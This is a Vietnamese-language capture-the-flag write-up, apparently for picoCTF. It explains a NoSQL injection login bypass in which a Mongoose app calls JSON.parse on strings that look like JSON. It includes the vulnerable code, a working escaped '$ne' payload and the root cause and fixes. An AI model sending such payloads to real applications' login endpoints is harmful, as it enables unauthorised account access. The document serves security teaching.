# NoSQL Injection — Auth Bypass qua Type Confusion & JSON Re-parsing

 App có login form và trả token/flag ngay trong response khi login thành công.

Đoạn code xử lý login lộ ra trong source:

```js
const user = await User.findOne({
  email:
    email.startsWith("{") && email.endsWith("}")
      ? JSON.parse(email)
      : email,
  password:
    password.startsWith("{") && password.endsWith("}")
      ? JSON.parse(password)
      : password,
});
```

Và response khi tìm thấy user:

```js
if (user) {
  res.json({
    success: true,
    email: user.email,
    token: user.token,   // flag nằm ngay đây
    firstName: user.firstName,
    lastName: user.lastName,
  });
}
```

Tức là chỉ cần login được (không cần biết mật khẩu thật), token/flag tự động bắn ra trong response.

## Thử đầu tiên: nhét thẳng operator MongoDB

Ý tưởng quen thuộc với NoSQL injection: gửi operator dạng object thay vì string.

```json
{
  "email": "admin@test.com",
  "password": {"$ne": ""}
}
```

Kết quả: server trả lỗi 500

```
password.startsWith is not a function
```

Lý do: `.startsWith()` là hàm của String, còn `{"$ne": ""}` khi parse JSON body ra thì `password` trở thành object thật trong JS, gọi hàm string trên nó là crash ngay. Object chưa kịp chạm tới Mongo thì code đã văng lỗi ở vòng kiểm tra ngoài rồi.

Thử đổi email thay vì password thì cũng dính y hệt lỗi đó ở `email.startsWith`. Vậy là cả hai trường đều đi qua check kiểu String trước khi query — không có cửa nào để nhét object trực tiếp.

## Đọc kỹ lại source thì thấy lỗ hổng thật sự nằm ở đâu

Nhìn lại điều kiện ternary:

```js
email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email
```

Code này không chỉ chặn — nó còn tự nguyện parse ngược một string trông giống JSON thành object. Đây chính là cửa: nếu gửi một **string** có nội dung là `{"$ne": ""}` (tức là bọc trong dấu ngoặc kép để nó vẫn là String ở tầng JSON body), hàm `startsWith("{")` vẫn chạy bình thường (vì đối tượng vẫn là string), điều kiện thoả, rồi code tự tay gọi `JSON.parse()` biến nó thành object operator thật.

Payload đúng:

```json
{
  "email": "{\"$ne\": \"\"}",
  "password": "{\"$ne\": \"\"}"
}
```

Điểm dễ trật là quên escape dấu ngoặc kép bên trong — vì đang nhét một chuỗi JSON vào bên trong một chuỗi JSON khác, thiếu `\"` thì body tự nó sai cú pháp JSON luôn, gửi lên còn chẳng tới được server.

## Chuyện gì xảy ra ở tầng server

1. `email` nhận vào là string `'{"$ne": ""}'` → qua được `startsWith("{") && endsWith("}")`
2. `JSON.parse('{"$ne": ""}')` → ra object `{"$ne": ""}`
3. Tương tự cho `password`
4. Query thực thi trở thành:

```js
User.findOne({
  email: { $ne: "" },
  password: { $ne: "" }
})
```

Tức là "tìm user nào có email khác rỗng VÀ password khác rỗng" — đúng với gần như mọi user trong DB. Mongo trả về user đầu tiên khớp, thường chính là user được seed lúc khởi động server (`picoplayer355@picoctf.org`). Login thành công mà không cần biết cả email lẫn password thật, và response JSON trả thẳng `token` — chính là flag.

## Root cause

- **Không có type validation** thật sự — check `startsWith`/`endsWith` chỉ là cách "đoán" input có phải JSON hay không, không phải xác thực an toàn.
- **Tự động deserialize input của người dùng** (`JSON.parse` trên dữ liệu chưa được whitelist) rồi đưa thẳng vào query Mongoose — đây là lỗi nghiêm trọng nhất, biến một cơ chế tưởng như để "hỗ trợ tính năng nào đó" thành cửa hậu injection.
- Mongoose mặc định không chặn các operator query (`$ne`, `$regex`, `$gt`...) nếu field nhận vào là object thay vì giá trị nguyên thuỷ.

## Fix

- Bỏ hẳn logic tự parse JSON từ input người dùng cho mục đích query — nếu cần nhận object thì phải định nghĩa schema/whitelist rõ field nào được phép, giá trị nào hợp lệ.
- Ép kiểu tường minh trước khi query: `if (typeof email !== "string" || typeof password !== "string") return res.status(400)...`
- Dùng `express-mongo-sanitize` để tự động strip các key bắt đầu bằng `$` hoặc chứa `.` trong request body/query.
- Không bao giờ trả token/secret trực tiếp trong response — kể cả login hợp lệ, nên trả về qua cơ chế riêng (session/JWT ký) chứ không đẩy thẳng field nhạy cảm ra JSON.
